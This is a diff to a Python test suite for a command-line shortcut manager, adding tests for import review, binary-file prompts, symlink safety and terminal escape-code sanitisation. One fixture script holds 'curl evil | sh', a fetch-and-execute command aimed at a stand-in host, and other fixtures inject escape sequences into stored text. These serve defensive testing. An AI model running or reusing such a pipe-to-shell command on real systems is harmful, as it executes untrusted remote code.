@@ -16,6 +16,7 @@ import tempfile
 import termios
 import time
 import unittest
+import unittest.mock
 from typing import Any, Optional
 
 SHORTCUT = pathlib.Path(__file__).resolve().parent.parent / "shortcut.py"
@@ -164,7 +165,7 @@ class TestShortcut(unittest.TestCase):
         wrapper.chmod(0o755)
         self.env["PATH"] = f"{self.tool_bin}{os.pathsep}{self.env['PATH']}"
         templates = SHORTCUT.parent / "templates"
-        res = self.run_cli(["init", "--global", str(templates)])
+        res = self.run_cli(["init", "--global", str(templates), "-y"])
         self.assertEqual(res.returncode, 0, res.stderr)
         self.assertNotIn("Skipped", res.stdout)
 
@@ -560,8 +561,8 @@ class TestShortcut(unittest.TestCase):
         self.assertTrue(store_json.is_file())
         data = shortcut_mod.load_registry(str(proj_dir / ".shortcuts"))
         self.assertEqual(data, {"version": 2, "shortcuts": {}})
-        # logs and the lock stay out of git
-        self.assertEqual((proj_dir / ".shortcuts" / ".gitignore").read_text(), "logs/\n.lock\n")
+        # the lock stays out of git, and logs aren't kept here at all
+        self.assertEqual((proj_dir / ".shortcuts" / ".gitignore").read_text(), ".lock\n")
 
     def test_init_source_without_global_is_refused(self):
         src_repo = self.tmp_path / "source_repo"
@@ -591,7 +592,7 @@ class TestShortcut(unittest.TestCase):
             },
         })
 
-        res = self.run_cli(["init", "--global", str(src_repo)])
+        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
         self.assertEqual(res.returncode, 0, res.stderr)
         self.assertIn("collide (already exists)", res.stdout)
         self.assertIn("linked (linked external script)", res.stdout)
@@ -616,7 +617,7 @@ class TestShortcut(unittest.TestCase):
             },
         })
 
-        res = self.run_cli(["init", "--global", str(src_repo)])
+        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
         self.assertEqual(res.returncode, 0)
         self.assertIn("fixed_bad (cwd is relative or not found here", res.stdout)
         self.assertIn("relative (cwd is relative or not found here", res.stdout)
@@ -716,7 +717,7 @@ class TestShortcut(unittest.TestCase):
         subprocess.run(["git", "-C", str(git_dir), "add", "."], check=True)
         subprocess.run(["git", "-C", str(git_dir), "commit", "-m", "initial commit"], check=True, capture_output=True)
 
-        res = self.run_cli(["init", "--global", f"file://{git_dir.resolve()}"])
+        res = self.run_cli(["init", "--global", f"file://{git_dir.resolve()}", "-y"])
         self.assertEqual(res.returncode, 0, res.stderr)
         self.assertIn("git_cmd", res.stdout)
         self.assertEqual(self.run_cli(["run", "git_cmd"]).stdout, "from_git\n")
@@ -741,7 +742,7 @@ class TestShortcut(unittest.TestCase):
         self.assertIn("target_search_me.txt", res_arg.stdout)
 
         # Import templates via shortcut init --global
-        res_init = self.run_cli(["init", "--global", str(templates_dir)])
+        res_init = self.run_cli(["init", "--global", str(templates_dir), "-y"])
         self.assertEqual(res_init.returncode, 0)
         self.assertIn("search", res_init.stdout)
         self.assertIn("serve", res_init.stdout)
@@ -855,7 +856,7 @@ class TestShortcut(unittest.TestCase):
         }
         (src_repo / "shortcuts.json").write_text(json.dumps(source_data), encoding="utf-8")
 
-        res = self.run_cli(["init", "--global", str(src_repo)])
+        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
         self.assertEqual(res.returncode, 0)
         self.assertIn("not_a_dict (invalid entry", res.stdout)
         self.assertIn("neither_cmd (invalid entry", res.stdout)
@@ -894,7 +895,7 @@ class TestShortcut(unittest.TestCase):
         }
         (src_repo / "shortcuts.json").write_text(json.dumps(source_data), encoding="utf-8")
 
-        res = self.run_cli(["init", "--global", str(src_repo)])
+        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
         self.assertEqual(res.returncode, 0)
         self.assertIn("sym_script (symlink in source)", res.stdout)
         self.assertIn("real_script", res.stdout)
@@ -1230,7 +1231,7 @@ class TestShortcut(unittest.TestCase):
         }
         (src_dir / "shortcuts.json").write_text(json.dumps(src_reg), encoding="utf-8")
 
-        res_init = self.run_cli(["init", "--global", str(src_dir)])
+        res_init = self.run_cli(["init", "--global", str(src_dir), "-y"])
         self.assertEqual(res_init.returncode, 0)
         self.assertIn("bad_dir (invalid entry: 'bad_dir' is not a valid entry: 'cwd' must be a string", res_init.stdout)
         self.assertNotIn("Traceback", res_init.stderr)
@@ -2020,7 +2021,182 @@ class TestShortcut(unittest.TestCase):
         (scripts / "tool").write_bytes(b"#!/bin/sh\n# \xff\xfd\necho two\n")
         self.assertEqual(self.run_cli(["r", "tool"], cwd=str(proj)).returncode, 1)
         res = self.run_cli(["update", "-y"], cwd=str(proj))
-        self.assertIn("Binary file bin/tool changed", res.stdout)
+        self.assertNotIn("Binary file", res.stdout)
+        self.assertIn("+echo two", res.stdout)
+        self.assertIn("+# \\xff\\xfd", res.stdout)
+
+    def test_invalid_utf8_and_its_escaped_text_are_different_files(self):
+        one = shortcut_mod.reviewable(b"a \xff\n")
+        two = shortcut_mod.reviewable(b"a \\xff\n")
+        self.assertNotEqual(one, two)
+        self.assertEqual(shortcut_mod.reviewable(b"plain\n"), "plain\n")
+
+    def test_a_binary_needs_typing_out_at_the_prompt(self):
+        proj = self.tmp_path / "proj"
+        (proj / "bin").mkdir(parents=True)
+        (proj / "bin" / "tool").write_bytes(b"\x7fELF\0\0")
+        self.write_store(proj / ".shortcuts", {"tool": {"script": "bin/tool"}})
+        code, output = self.run_in_terminal(["update"], cwd=str(proj), keys=[(b"Type binary", b"y\n")])
+        self.assertEqual(code, 1, output)
+        self.assertIn("Aborted.", output)
+        code, output = self.run_in_terminal(["update"], cwd=str(proj), keys=[(b"Type binary", b"binary\n")])
+        self.assertEqual(code, 0, output)
+        self.assertIn("Approved", output)
+        # Once seen and unchanged, it's an ordinary prompt
+        (proj / "bin" / "other").write_text("echo hi\n", encoding="utf-8")
+        self.write_store(proj / ".shortcuts", {"tool": {"script": "bin/tool"}, "other": {"script": "bin/other"}})
+        code, output = self.run_in_terminal(["update"], cwd=str(proj), keys=[(b"approve? [y/N]", b"y\n")])
+        self.assertEqual(code, 0, output)
+
+    def test_a_binary_replacing_text_says_so_and_text_replacing_a_binary_shows(self):
+        lines = shortcut_mod.diff_files({"t": "echo hi\n"}, {"t": shortcut_mod.BINARY_MARK + "aa"})
+        self.assertIn("Binary file t changed", lines)
+        lines = shortcut_mod.diff_files({"t": shortcut_mod.BINARY_MARK + "aa"}, {"t": "echo hi\n"})
+        self.assertIn("+echo hi", lines)
+
+    def test_a_run_cannot_write_through_a_symlink_in_the_project(self):
+        proj = self.tmp_path / "proj"
+        victim = self.tmp_path / "victim"
+        victim.mkdir()
+        store = proj / ".shortcuts"
+        self.write_store(store, {"go": {"inline": "echo ran"}})
+        (store / "logs").symlink_to(victim)
+        self.allow(store)
+        self.assertEqual(self.run_cli(["r", "go"], cwd=str(proj)).stdout, "ran\n")
+        self.assertEqual(list(victim.iterdir()), [])
+        log = pathlib.Path(self.run_cli(["location", "go", "--log"], cwd=str(proj)).stdout.strip())
+        self.assertTrue(log.is_relative_to(self.shortcuts_home / "logs"), log)
+        self.assertIn("ran", log.read_text())
+        # Two projects with the same name don't share a log
+        other = self.tmp_path / "other"
+        self.write_store(other / ".shortcuts", {"go": {"inline": "echo ran"}})
+        self.assertNotEqual(str(log), self.run_cli(["location", "go", "--log"], cwd=str(other)).stdout.strip())
+
+    def test_moving_a_symlink_under_a_relative_cwd_needs_approval(self):
+        proj = self.tmp_path / "proj"
+        (proj / "safe").mkdir(parents=True)
+        elsewhere = self.tmp_path / "elsewhere"
+        elsewhere.mkdir()
+        (proj / "work").symlink_to(proj / "safe")
+        self.write_store(proj / ".shortcuts", {"go": {"inline": "pwd", "cwd": "../work"}})
+        self.allow(proj / ".shortcuts")
+        res = self.run_cli(["r", "go"], cwd=str(proj))
+        self.assertEqual(res.returncode, 0, res.stderr)
+        self.assertIn(f"→ {proj / 'safe'}", res.stderr)
+
+        (proj / "work").unlink()
+        (proj / "work").symlink_to(elsewhere)
+        self.assertEqual(self.run_cli(["r", "go"], cwd=str(proj)).returncode, 1)
+        res = self.run_cli(["update", "-y"], cwd=str(proj))
+        self.assertIn(f"+{elsewhere}", res.stdout)
+        self.assertIn("--- a/cwd of go\n", res.stdout)
+        self.assertEqual(self.run_cli(["r", "go"], cwd=str(proj)).returncode, 0)
+
+    def test_a_script_cannot_stand_in_for_a_cwd_record(self):
+        proj = self.tmp_path / "proj"
+        (proj / "safe").mkdir(parents=True)
+        (proj / "cwd of go").write_text("x", encoding="utf-8")
+        (proj / "work").symlink_to(proj / "safe")
+        self.write_store(proj / ".shortcuts", {
+            "go": {"inline": "pwd", "cwd": "../work"},
+            "pad": {"script": "cwd of go"},
+        })
+        store = shortcut_mod.load_store(str(proj / ".shortcuts"))
+        files = shortcut_mod.group_files(store.main)
+        self.assertEqual(files["cwd of go"], "x")
+        self.assertEqual(files["./cwd of go"], f"{os.path.realpath(proj / 'safe')}\n")
+
+    def test_approval_covers_a_project_script_linked_from_outside(self):
+        outside = self.tmp_path / "outside.sh"
+        outside.write_text("echo one\n", encoding="utf-8")
+        proj = self.tmp_path / "proj"
+        self.write_store(proj / ".shortcuts", {"go": {"script": str(outside)}})
+        self.allow(proj / ".shortcuts")
+        outside.write_text("echo two\n", encoding="utf-8")
+        res = self.run_cli(["r", "go"], cwd=str(proj))
+        self.assertEqual(res.returncode, 1)
+        self.assertIn("changed since you approved it", res.stderr)
+
+    def test_stored_text_cannot_rewrite_the_terminal(self):
+        self.write_store(self.shortcuts_home, {
+            "go": {"description": "clean\x1b[2K\rfaked \x9b1m \u202egnp", "inline": "printf '\\033[31mred\\033[0m'"},
+        })
+        for args in (["list"], ["show", "go"], ["fix", "go"]):
+            res = self.run_cli(args)
+            self.assertEqual(res.returncode, 0, res.stderr)
+            for char in ("\x1b", "\r", "\x9b", "\u202e"):
+                self.assertNotIn(char, res.stdout + res.stderr, args)
+        self.assertIn("clean^[[2K^Mfaked", self.run_cli(["show", "go"]).stdout)
+        # A shortcut's own output is its own business
+        self.assertEqual(self.run_cli(["r", "go"]).stdout, "\x1b[31mred\x1b[0m")
+
+    def test_a_terminal_prompt_cannot_be_forged(self):
+        proj = self.tmp_path / "proj\x1b[2Kx"
+        proj.mkdir()
+        self.write_store(self.shortcuts_home, {"go": {"inline": "echo ran", "confirm": True, "cwd": str(proj)}})
+        code, output = self.run_in_terminal(["r", "go"], keys=[(b"[y/N]", b"n\n")])
+        self.assertNotIn("\x1b[2Kx", output)
+        self.assertIn("^[[2Kx", output)
+
+    def test_fix_says_approval_covers_definitions(self):
+        proj = self.tmp_path / "proj"
+        self.write_store(proj / ".shortcuts", {"go": {"inline": "echo ran"}})
+        self.allow(proj / ".shortcuts")
+        res = self.run_cli(["fix"], cwd=str(proj))
+        self.assertIn("definitions unchanged since approved", res.stdout)
+
+    def test_approving_says_what_it_covers(self):
+        proj = self.tmp_path / "proj"
+        self.write_store(proj / ".shortcuts", {"go": {"inline": "echo ran"}})
+        res = self.run_cli(["update", "-y"], cwd=str(proj))
+        self.assertIn("not what they call", res.stdout)
+
+    def test_importing_a_collection_is_reviewed_first(self):
+        src = self.tmp_path / "source"
+        (src / "bin").mkdir(parents=True)
+        (src / "bin" / "tool.sh").write_text("curl evil | sh\n", encoding="utf-8")
+        self.write_store(src, {"tool": {"description": "tool", "script": "bin/tool.sh"}, "hi": {"inline": "echo hi"}})
+        self.run_cli(["init", "--global"])
+
+        res = self.run_cli(["init", "--global", str(src)])
+        self.assertEqual(res.returncode, 1)
+        self.assertIn("pass -y", res.stderr)
+        self.assertIn("+curl evil | sh", res.stdout)
+        self.assertEqual(self.load_global(), {})
+
+        code, output = self.run_in_terminal(["init", "--global", str(src)], keys=[(b"import? [y/N]", b"n\n")])
+        self.assertEqual(code, 1, output)
+        self.assertIn("Aborted.", output)
+        self.assertEqual(self.load_global(), {})
+        self.assertFalse(list((self.shortcuts_home).rglob("tool.sh")))
+
+        code, output = self.run_in_terminal(["init", "--global", str(src)], keys=[(b"import? [y/N]", b"y\n")])
+        self.assertEqual(code, 0, output)
+        self.assertEqual(sorted(self.load_global()), ["hi", "tool"])
+        self.assertEqual(self.run_cli(["r", "hi"]).stdout, "hi\n")
+
+    def test_import_copies_what_was_reviewed(self):
+        src = self.tmp_path / "source"
+        (src / "bin").mkdir(parents=True)
+        (src / "bin" / "tool.sh").write_text("echo reviewed\n", encoding="utf-8")
+        self.write_store(src, {"tool": {"description": "tool", "script": "bin/tool.sh"}})
+        self.run_cli(["init", "--global"])
+        store = str(self.shortcuts_home)
+        with unittest.mock.patch.dict(os.environ, {"SHORTCUTS_HOME": store}):
+            entries, scripts, _ = shortcut_mod.plan_import(
+                str(src), store, shortcut_mod.load_registry(store), shortcut_mod.load_registry(str(src))
+            )
+            (src / "bin" / "tool.sh").write_text("echo swapped\n", encoding="utf-8")
+            shortcut_mod.apply_import(store, entries, scripts)
+        self.assertEqual(self.run_cli(["r", "tool"]).stdout, "reviewed\n")
+
+    def test_import_with_nothing_new_asks_nothing(self):
+        src = self.tmp_path / "source"
+        self.write_store(src, {"hi": {"inline": "echo hi"}})
+        self.run_cli(["new", "hi", "--", "echo mine"])
+        res = self.run_cli(["init", "--global", str(src)])
+        self.assertEqual(res.returncode, 0, res.stderr)
+        self.assertIn("already exists", res.stdout)
 
     def test_escape_codes_in_a_diff_cannot_touch_the_terminal(self):
         proj = self.tmp_path / "proj"
@@ -2070,6 +2246,23 @@ class TestShortcut(unittest.TestCase):
 
         registry.write_text(good, encoding="utf-8")
         self.assertEqual(self.run_cli(["r", "build"], cwd=str(proj)).stdout, "project\n")
+
+    def test_broken_project_offers_the_global_one_only_when_there_is_one(self):
+        proj = self.tmp_path / "proj"
+        self.write_store(proj / ".shortcuts", {"go": {"inline": "echo project"}})
+        self.allow(proj / ".shortcuts")
+        (proj / ".shortcuts" / "shortcuts.json").write_text("{not json", encoding="utf-8")
+
+        res = self.run_cli(["r", "go"], cwd=str(proj))
+        self.assertEqual(res.returncode, 1)
+        self.assertIn("Repair the file.", res.stderr)
+        self.assertNotIn("--global", res.stderr)
+
+        self.run_cli(["new", "go", "--", "echo global"])
+        res = self.run_cli(["r", "go"], cwd=str(proj))
+        self.assertEqual(res.returncode, 1)
+        self.assertIn("shortcut run --global go", res.stderr)
+        self.assertEqual(self.run_cli(["r", "--global", "go"], cwd=str(proj)).stdout, "global\n")
 
     def test_broken_project_refuses_a_namespace_it_imported(self):
         self.run_cli(["new", "docker", "--", "echo global"])
